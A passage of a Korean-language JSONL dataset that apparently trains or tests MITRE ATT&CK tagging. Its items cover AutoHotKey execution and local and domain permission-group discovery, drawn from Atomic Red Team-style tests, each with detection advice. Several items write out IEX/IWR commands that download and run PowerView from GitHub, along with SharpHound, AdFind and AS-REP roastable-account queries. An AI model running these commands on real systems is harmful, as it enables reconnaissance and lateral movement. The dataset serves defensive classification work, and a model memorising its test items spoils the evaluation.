실행 로직이 포함된다. 3) PowerShell에서 Start-Process -FilePath \"#{autohotkey_path}\" -ArgumentList \"#{script_path}\" 명령을 실행해 AutoHotKey 엔진을 통해 스크립트를 실행한다. 4) 스크립트 실행에 성공하면 메시지 박스가 표시되고, Windows 계산기(calc.exe)가 실행된다. 5) 실제 공격 시나리오에서는 메시지 박스를 빼고 백그라운드로만 동작하게 하거나, calc.exe 대신 cmd.exe, powershell.exe, 추가 악성 페이로드를 실행하는 명령을 넣어 악성 행위를 수행할 수 있다. 6) 수집·분석 관점에서는 AutoHotKeyU64.exe 실행 흔적, calc.ahk 파일 경로, 명령줄 인자(스크립트 경로), 그리고 이후 생성된 자식 프로세스(calc.exe 등)를 기반으로 탐지·추적할 수 있다.\n[대표 명령 예시]\nStart-Process -FilePath \"#{autohotkey_path}\" -ArgumentList \"#{script_path}\"", "answer": "이 행위는 MITRE ATT&CK의 T1059.010 \"Command and Scripting Interpreter: AutoHotKey & AutoIT\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.001_1f454dd6-e134-44df-bebb-67de70fb6cd8_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.001 Permission Groups Discovery: Local Groups (Tactic: Discovery)\n[요약] net localgroup 명령을 사용해 로컬 그룹 목록과 Administrators 그룹 구성원을 조회하여, 시스템에서 사용 가능한 권한 그룹과 로컬 관리자 그룹 멤버를 식별한다.\n[절차] 1) 명령 프롬프트(cmd.exe)를 실행한다. 2) net localgroup 명령을 통해 시스템 내 모든 로컬 그룹 목록을 조회한다. 3) net localgroup \"Administrators\" 명령을 실행하여 로컬 Administrators 그룹에 포함된 계정 목록을 확인한다. 4) 출력 결과를 바탕으로 공격자는 현재 호스트에서 고권한 계정(로컬 관리자 계정)을 식별하고, 이후 권한 상승이나 측면 이동 시 활용할 수 있다. 5) 방어 관점에서는 net localgroup / Administrators 쿼리가 비정상 사용자나 스크립트에서 반복 호출되는지 모니터링해 탐지 지표로 사용할 수 있다.\n[대표 명령 예시]\nnet localgroup\nnet localgroup \"Administrators\"", "answer": "이 행위는 MITRE ATT&CK의 T1069.001 \"Permission Groups Discovery: Local Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.001_a580462d-2c19-4bc7-8b9a-57a41b7d3ba4_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.001 Permission Groups Discovery: Local Groups (Tactic: Discovery)\n[요약] PowerShell의 Get-LocalGroup, Get-LocalGroupMember cmdlet을 사용해 로컬 그룹 및 Administrators 그룹 멤버를 조회한다.\n[절차] 1) PowerShell을 실행한다. 2) get-localgroup 명령으로 로컬 그룹 목록을 조회한다. 3) Get-LocalGroupMember -Name \"Administrators\" 명령으로 로컬 Administrators 그룹 구성원을 나열한다. 4) 공격자는 출력된 그룹 멤버를 통해, 현재 시스템에서 관리자 권한을 가진 계정 및 서비스 계정을 파악할 수 있다. 5) 방어자는 Get-LocalGroup / Get-LocalGroupMember 호출 패턴을 명령줄 로그, PowerShell 로그(Event ID 4104/4103 등)로 수집·분석하여, 의심스러운 권한 그룹 열람 시도를 탐지할 수 있다.\n[대표 명령 예시]\nget-localgroup\nGet-LocalGroupMember -Name \"Administrators\"", "answer": "이 행위는 MITRE ATT&CK의 T1069.001 \"Permission Groups Discovery: Local Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.001_e03ada14-0980-4107-aff1-7783b2b59bb1_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.001 Permission Groups Discovery: Local Groups (Tactic: Discovery)\n[요약] BloodHound 수집기인 SharpHound.exe를 이용하여 도메인 환경에서 원격으로 각 호스트의 로컬 Administrators 그룹 구성원을 수집(LocalAdmin CollectionMethod)하는 시나리오.\n[절차] 1) PowerShell에서 SharpHound.exe가 지정된 경로(#{sharphound_path})에 존재하는지 확인한다. 2) 존재하지 않을 경우, PathToAtomicsFolder\\..\\ExternalPayloads\\ 폴더를 생성하고 GitHub에서 SharpHound.exe를 다운로드해 배치한다. 3) New-Item -Path \"#{output_path}\" -ItemType Directory 명령으로 SharpHound 결과 저장용 디렉터리를 생성한다. 4) & \"#{sharphound_path}\" -d \"#{domain}\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"#{output_path}\" 명령을 실행해 LocalAdmin 수집을 수행한다. 5) SharpHound는 SAMR 등을 이용해 각 도메인 호스트의 로컬 Administrators 그룹 멤버 정보를 수집하고, JSON/ZIP 형태의 결과를 #{output_path}에 저장한다. 6) 공격자는 이 결과를 BloodHound GUI로 불러와 그래프 형태로 분석하며, 도메인 내에서 어떤 계정이 어느 호스트의 Local Admin 권한을 가지는지 파악해 측면 이동 및 권한 상승 경로를 설계한다. 7) 실험 종료 후 cleanup_command를 사용하면 생성된 결과 디렉터리(#{output_path})를 제거할 수 있다.\n[대표 명령 예시]\nNew-Item -Path \"#{output_path}\" -ItemType Directory > $null\n& \"#{sharphound_path}\" -d \"#{domain}\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"#{output_path}\"", "answer": "이 행위는 MITRE ATT&CK의 T1069.001 \"Permission Groups Discovery: Local Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.001_7413be50-be8e-430f-ad4d-07bf197884b2_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.001 Permission Groups Discovery: Local Groups (Tactic: Discovery)\n[요약] wmic group get name 명령을 통해 WMI 인터페이스로 로컬 그룹 목록을 열람하는 시나리오.\n[절차] 1) 명령 프롬프트(cmd.exe)를 실행한다. 2) wmic group get name 명령을 실행하여 현재 시스템의 로컬 그룹 이름 목록을 가져온다. 3) 공격자는 반환된 그룹 이름을 기반으로 Administrators, Remote Desktop Users, Backup Operators 등 공격에 유리한 그룹을 식별할 수 있다. 4) 방어 측에서는 wmic group get name 호출을 명령줄 로그, 프로세스 생성 로그를 통해 모니터링하고, 스크립트나 비인가 계정에서의 반복 호출 여부를 탐지 지표로 삼을 수 있다.\n[대표 명령 예시]\nwmic group get name", "answer": "이 행위는 MITRE ATT&CK의 T1069.001 \"Permission Groups Discovery: Local Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.001_69119e58-96db-4110-ad27-954e48f3bb13_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.001 Permission Groups Discovery: Local Groups (Tactic: Discovery)\n[요약] PowerShell Get-WMIObject Win32_Group를 활용해 WMI를 통해 로컬 그룹 정보를 열람하는 시나리오.\n[절차] 1) PowerShell을 실행한다. 2) Get-WMIObject Win32_Group 명령을 실행하여, WMI를 통해 시스템에 존재하는 로컬 그룹 객체 목록을 가져온다. 3) 결과에는 각 그룹의 도메인, 이름, SID 등의 정보가 포함될 수 있으며, 공격자는 이를 통해 중요한 그룹(관리자, 원격 접속 관련 그룹 등)을 식별한다. 4) 이 방식은 기존 net localgroup보다 더 풍부한 메타데이터를 제공할 수 있어, 자동화된 스크립트에서 자주 사용될 수 있다. 5) 방어자는 PowerShell의 WMI 호출(특히 Win32_Group 대상)을 모니터링하여, 평소와 다른 시점·계정에서 발생하는 그룹 열람 시도를 탐지할 수 있다.\n[대표 명령 예시]\nGet-WMIObject Win32_Group", "answer": "이 행위는 MITRE ATT&CK의 T1069.001 \"Permission Groups Discovery: Local Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_dd66d77d-8998-48c0-8024-df263dc2ce5d_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] net localgroup / net group /domain 명령을 통해 도메인 그룹(Enterprise Admins, Domain Admins 등)을 열람하여 도메인 내 고권한 그룹과 구성원을 식별한다.\n[절차] 1) 명령 프롬프트(cmd.exe)를 실행한다. 2) net localgroup 명령으로 로컬 그룹 목록을 먼저 확인한다(도메인 환경인지 간접적으로 확인 가능). 3) net group /domain 명령을 실행해 도메인 내 정의된 그룹 목록을 조회한다. 4) net group \"enterprise admins\" /domain 명령으로 도메인 포리스트 전체를 관리할 수 있는 Enterprise Admins 그룹의 멤버를 확인한다. 5) net group \"domain admins\" /domain 명령으로 해당 도메인의 Domain Admins 그룹 멤버를 확인한다. 6) 공격자는 여기서 식별한 계정을 추가 공격(피싱, 자격 증명 탈취, 세션 가로채기 등)의 주요 타깃으로 삼을 수 있다. 7) 방어자는 net group /domain, net group \"enterprise admins\" /domain, net group \"domain admins\" /domain 호출을 명령줄 로깅/EDR로 모니터링해 비인가 계정의 도메인 그룹 열람을 탐지 지표로 활용할 수 있다.\n[대표 명령 예시]\nnet localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] PowerShell의 get-ADPrincipalGroupMembership을 사용해 특정 사용자(기본: 현재 사용자)가 속한 AD 그룹 목록을 열람한다.\n[절차] 1) PowerShell을 실행한다. 2) get-ADPrincipalGroupMembership #{user} | select name 명령을 실행하여 해당 사용자가 속한 모든 도메인 그룹 이름을 출력한다. 3) 공격자는 Domain Admins, Enterprise Admins, DNSAdmins, Account Operators 등 고위험 그룹에 사용자가 속해 있는지 확인하여 현재 계정의 권한 수준을 판단한다. 4) 방어자는 AD 모듈 기반 쿼리(get-ADPrincipalGroupMembership)를 PowerShell 로그(Event ID 4104 등)로 수집하고, 비정상 계정 및 워크스테이션에서의 반복적인 그룹 조회를 탐지 포인트로 활용할 수 있다.\n[대표 명령 예시]\nget-ADPrincipalGroupMembership #{user} | select name", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_0afb5163-8181-432e-9405-4322710c0c37_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] net groups / net group 명령을 다양한 철자·별칭으로 호출해 Account Operators, Exchange Organization Management, Backup Operators, Domain Admins 등 고권한 도메인 그룹을 열람한다.\n[절차] 1) 명령 프롬프트에서 다음 명령들을 순차적으로 실행한다. 2) net groups \"Account Operators\" /domain   → Account Operators 그룹 구성원이 출력된다. 3) net groups \"Exchange Organization Management\" /domain   → Exchange 관리 그룹 멤버가 출력된다. 4) net group \"BUILTIN\\Backup Operators\" /domain   → Backup Operators 그룹 조회를 시도한다(환경에 따라 오류 또는 제한된 정보). 5) net group \"Domain Admins\" /domain   → Domain Admins 그룹 멤버를 확인한다. 6) 공격자는 이 정보를 통해 도메인 내에서 백업, 계정 관리, Exchange 관리, 도메인 전체 관리를 수행할 수 있는 계정을 찾는다. 7) 방어 관점에서는 net group(s) 명령으로 특정 고권한 그룹만 반복 조회하는 행위를 IOC(침해 지표)로서 모니터링할 수 있다.\n[대표 명령 예시]\nnet groups \"Account Operators\" /domain\nnet groups \"Exchange Organization Management\" /domain\nnet group \"BUILTIN\\Backup Operators\" /domain\nnet group \"Domain Admins\" /domain", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_a2d71eee-a353-4232-9f86-54f4288dd8c1_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] PowerView의 Find-LocalAdminAccess 함수를 사용해, 현재 사용자 토큰으로 로컬 관리자 권한이 있는 도메인 내 호스트 목록을 찾는다.\n[절차] 1) PowerShell을 관리자/일반 권한으로 실행한다. 2) [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 로 TLS 버전을 강제 설정한다. 3) IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Recon/PowerView.ps1' -UseBasicParsing) 명령으로 PowerView 스크립트를 메모리에 로드한다. 4) Find-LocalAdminAccess -Verbose 명령을 실행한다. 5) 스크립트는 도메인 내 호스트들을 순회하며 현재 사용자 계정으로 로컬 Administrators 권한이 있는지 테스트하고, 접근 가능한 호스트를 출력한다. 6) 공격자는 이 리스트를 바탕으로 측면 이동이 가능한 후보 호스트를 식별하여 RDP/SMB/WinRM 등으로 추가 침투를 수행한다. 7) 방어자는 PowerView 로딩 및 Find-LocalAdminAccess 호출을 PowerShell 로그에서 탐지하고, 동시에 여러 호스트로 향하는 비정상 로그인 시도를 네트워크·인증 로그에서 모니터링할 수 있다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] PowerView의 Invoke-EnumerateLocalAdmin을 사용해 도메인 내 모든 머신의 로컬 Administrators 그룹 멤버를 열람한다.\n[절차] 1) PowerShell에서 TLS 설정을 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 로 맞춘다. 2) IEX (IWR '.../PowerView.ps1' -UseBasicParsing) 명령으로 PowerView를 메모리에 로드한다. 3) Invoke-EnumerateLocalAdmin -Verbose 명령을 실행한다. 4) 도메인 내 각 호스트에 대해 로컬 Administrators 그룹 멤버를 열람하고, 어느 사용자/그룹이 어떤 호스트에서 로컬 관리자 권한을 가지는지 출력한다. 5) 공격자는 이 정보를 통해 도메인 내 권한 그래프를 파악하고, 어떤 계정에 먼저 접근하면 더 많은 호스트의 관리자 권한을 획득할 수 있는지 계획한다. 6) 방어 관점에서는 단일 호스트에서 전체 도메인을 대상으로 SAMR/WMI/LDAP 쿼리가 급증하는 패턴을 중요한 탐지 시그널로 본다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_64fdb43b-5259-467a-b000-1b02c00e510a_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] PowerView의 Find-GPOComputerAdmin을 사용해 특정 컴퓨터에 대해 GPO를 통해 부여된 로컬 관리자 권한 보유 계정을 식별한다.\n[절차] 1) PowerShell을 실행하고 TLS 설정을 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 로 변경한다. 2) IEX (IWR '.../PowerView.ps1' -UseBasicParsing) 명령으로 PowerView를 메모리에 로드한다. 3) Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose 명령을 실행하여 특정 호스트에 적용되는 GPO를 분석한다. 4) GPO를 통해 해당 컴퓨터에 로컬 관리자 권한이 부여된 사용자/그룹 목록이 출력된다. 5) 공격자는 중앙 GPO 정책 하나만 조작해도 다수의 호스트에 관리자 권한을 부여·탈취할 수 있다는 점을 악용할 수 있다. 6) 방어자는 GPO 기반 로컬 관리자 구성 변경 이벤트와, 이와 연관된 PowerView·AD 쿼리 로그를 연계 분석해 탐지 전략을 세울 수 있다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_870ba71e-6858-4f6d-895c-bb6237f6121b_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] 도메인에서 Kerberos Pre-Authentication이 필요 없는 계정을 Get-ADUser로 열람하여 AS-REP Roasting 공격에 사용 가능한 계정을 찾는다.\n[절차] 1) 사전 조건 단계에서 Get-CIMInstance -Class Win32_ComputerSystem으로 PartOfDomain 여부를 확인한다. 2) ActiveDirectory 모듈을 설치(Add-WindowsCapability ...) 후 Import 가능해야 한다. 3) get-aduser -f * -pr DoesNotRequirePreAuth 명령으로 모든 사용자 계정의 DoesNotRequirePreAuth 속성을 조회한다. 4) where {$_.DoesNotRequirePreAuth -eq $TRUE} 필터로 Pre-Auth가 필요 없는 계정만 남긴다. 5) 이 계정들에 대해 AS-REP Roasting 공격(AS-REQ 전송 후 AS-REP 응답에서 해시 추출)을 수행해 오프라인 비밀번호 크래킹을 시도할 수 있다. 6) 방어자는 DoesNotRequirePreAuth가 TRUE인 계정을 최소화하고, 해당 속성 변경 이벤트를 모니터링하며, 비정상적인 AS-REQ/AS-REP 패턴을 탐지해야 한다.\n[대표 명령 예시]\nget-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_48ddc687-82af-40b7-8472-ff1e742e8274_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] AdFind.exe 도구를 이용해 objectcategory=group 필터로 AD 그룹들을 LDAP 쿼리 방식으로 대량 열람한다.\n[절차] 1) 사전 단계에서 GitHub에서 AdFind.exe를 다운로드해 지정된 경로에 둔다. 2) 명령 프롬프트에서 \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group) #{optional_args} 명령을 실행한다. 3) AdFind는 objectcategory=group인 AD 엔트리(그룹 객체)를 LDAP으로 질의해 그룹명, DN 등 다양한 속성을 출력한다. 4) 공격자는 optional_args에 추가 필드를 지정해 Domain Admins, Enterprise Admins, 특정 OU의 그룹만 필터링하는 식으로 정밀 정찰을 수행할 수 있다. 5) 방어자는 AdFind.exe 실행 자체와, 짧은 시간 안에 대량 LDAP 쿼리가 발생하는 패턴을 탐지 지표로 삼을 수 있다.\n[대표 명령 예시]\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group) #{optional_args}", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8_Q9", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] PowerShell ActiveDirectory 모듈의 Get-AdGroup -Filter *를 사용해 전체 AD 그룹 목록을 열람한다.\n[절차] 1) PowerShell을 실행하고, Import-Module ActiveDirectory를 통해 모듈을 로드한다(필요 시). 2) Get-AdGroup -Filter * 명령을 실행해 모든 그룹 객체를 나열한다. 3) 공격자는 이름/DistinguishedName/GroupCategory/GroupScope 등 속성을 확인하며 도메인 구조와 고권한 그룹 위치를 파악한다. 4) 방어자는 Get-AdGroup 쿼리가 평소보다 대량으로, 또는 비인가 워크스테이션에서 실행되는지를 모니터링할 수 있다.\n[대표 명령 예시]\nGet-AdGroup -Filter *", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_9f4e344b-8434-41b3-85b1-d38f29d148d0_Q10", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] PowerShell의 [adsisearcher] 타입 가속기를 사용해 objectcategory=group 필터로 AD 그룹을 LDAP 수준에서 직접 검색한다.\n[절차] 1) PowerShell을 실행한다. 2) ([adsisearcher]\"objectcategory=group\").FindAll() 명령으로 그룹 전체 목록을 조회한다. 3) ([adsisearcher]\"objectcategory=group\").FindOne() 명령으로 하나의 그룹 샘플을 조회해 구조를 확인한다. 4) 공격자는 LDAP 쿼리 조건을 바꿔 특정 OU/Name 패턴/Group Scope 등을 기준으로 정밀 스캔을 수행할 수 있다. 5) 방어자는 LDAP 질의 패턴과 PowerShell 로그를 결합해, 평소와 다른 ADSI 기반 대량 그룹 조회를 탐지 지표로 사용한다.\n[대표 명령 예시]\n([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8_Q11", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] Get-ADUser와 userAccountControl 플래그를 이용해 Pre-Auth가 비활성화된 계정(AS-REP Roasting 가능 계정)을 찾는다.\n[절차] 1) 사전 단계에서 Get-CIMInstance로 도메인 가입 여부를 확인하고, 필요 시 RSAT AD 모듈을 설치한다. 2) PowerShell에서 Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol 명령을 실행한다. 3) useraccountcontrol 비트 플래그 중 4194304(UF_DONT_REQUIRE_PREAUTH)에 해당하는 계정만 필터된다. 4) Format-Table name으로 계정 이름만 보기 좋게 출력한다. 5) 공격자는 이 계정들에 대해 AS-REP Roasting 공격을 수행해 Kerberos AS-REP 응답에서 해시를 추출, 오프라인 크래킹을 시도할 수 있다. 6) 방어자는 UF_DONT_REQUIRE_PREAUTH 설정 상태를 정기 점검하고, 해당 속성 변경 이벤트 및 에러 패턴을 모니터링해야 한다.\n[대표 명령 예시]\nGet-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_46352f40-f283-4fe5-b56d-d9a71750e145_Q12", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] PowerView의 Get-DomainGroupMember를 사용해 Domain Admins 그룹의 모든 멤버를 열람한다.\n[절차] 1) PowerShell에서 TLS12를 설정한 뒤, IEX (IWR '.../PowerView.ps1' -UseBasicParsing) 명령으로 PowerView를 로드한다. 2) Get-DomainGroupMember \"Domain Admins\" 명령을 실행한다. 3) Domain Admins 그룹에 속한 모든 사용자·그룹의 정보가 출력된다. 4) 공격자는 이 정보를 통해 최우선 공격 타깃(도메인 관리자 계정)을 선정한다. 5) 방어자는 Domain Admins 조회는 매우 민감한 행위이므로, 해당 PowerShell 명령/LDAP 쿼리를 집중 모니터링해야 한다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
